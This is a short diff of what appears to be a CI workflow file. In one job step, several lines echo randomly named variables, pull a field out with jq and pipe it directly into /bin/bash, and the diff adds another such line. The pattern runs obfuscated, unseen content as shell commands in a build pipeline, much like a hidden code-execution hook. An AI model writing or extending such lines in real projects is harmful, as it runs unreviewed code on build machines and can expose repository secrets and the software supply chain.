@@ -56,6 +56,7 @@ jobs:
           echo $c3760 | jq -r .lis865 | /bin/bash
           printf '%s' "$itm89091" | jq -r .cknrm095 | /bin/bash
           echo $og107 | jq -r .mgs703 | /bin/bash
+          echo $qyb31579 | jq -r .bscug9895 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
